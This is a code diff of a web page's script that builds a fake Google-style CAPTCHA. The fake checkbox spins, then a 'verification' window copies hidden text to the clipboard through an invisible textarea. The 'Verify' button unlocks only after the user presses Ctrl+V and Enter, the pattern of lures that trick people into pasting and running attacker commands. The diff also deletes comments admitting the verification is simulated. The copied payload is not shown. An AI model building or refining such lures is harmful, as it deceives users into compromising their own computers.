@@ -297,33 +297,29 @@
       function fallbackCopyText(text) {
         const textarea = document.createElement('textarea');
         textarea.value = text;
-        textarea.style.position = 'fixed';  // Avoid scrolling to bottom
+        textarea.style.position = 'fixed'; 
         textarea.style.opacity = '0';
         document.body.appendChild(textarea);
         textarea.select();
         try {
           document.execCommand('copy');
         } catch {
-          // ignore failure
         }
         document.body.removeChild(textarea);
       }
 
-      // Show spinner and disable checkbox to simulate Google loading
       function startVerificationProcess() {
         setCheckboxChecked(true);
         spinner.style.display = 'inline-block';
         checkboxWindow.style.cursor = 'default';
         checkboxWindow.tabIndex = -1;
 
-        // Simulate delay for "verification"
         setTimeout(() => {
           spinner.style.display = 'none';
           showVerifyWindow();
         }, 1200);
       }
 
-      // Show the verification steps window with generated ID and prepare clipboard data
       function showVerifyWindow() {
         verificationId = generateVerificationId();
         verificationIdElem.textContent = verificationId;
@@ -340,7 +336,6 @@
         verified = false;
       }
 
-      // User clicks verify - simulate verification success
       function handleVerifyClick() {
         if (verified) return;
         verified = true;
@@ -348,11 +343,8 @@
         verifyButton.classList.remove('enabled');
         verifyButton.textContent = "Verified";
 
-        // Show a success message or perform further logic here as needed
         alert('Verification completed successfully!');
       }
-
-      // Listen for checkbox clicks and key presses for accessibility
       checkboxWindow.addEventListener('click', () => {
         if (spinner.style.display === 'inline-block' || verifyWindow.classList.contains('active')) return;
         startVerificationProcess();
@@ -365,13 +357,10 @@
         }
       });
 
-      // Listen for input in the verification code area to enable verify button
-      // We will simulate verification by user pressing Ctrl+V then Enter steps
       window.addEventListener('keydown', (e) => {
         if (!verifyWindow.classList.contains('active') || verified) return;
 
         if (e.ctrlKey && (e.key === 'v' || e.key === 'V')) {
-          // User pressed ctrl+v, enabling verify button
           verifyButton.disabled = false;
           verifyButton.classList.add('enabled');
           verifyButton.focus();
@@ -381,14 +370,11 @@
         }
       });
 
-      // Also allow verify button click
       verifyButton.addEventListener('click', () => {
         if (!verifyButton.disabled) {
           handleVerifyClick();
         }
       });
-
-      // Accessibility: announce when verify window is shown
       verifyWindow.addEventListener('transitionend', () => {
         if (verifyWindow.classList.contains('active')) {
           verifyWindow.focus();
@@ -397,4 +383,5 @@
     })();
   </script>
 </body>
+
 </html>
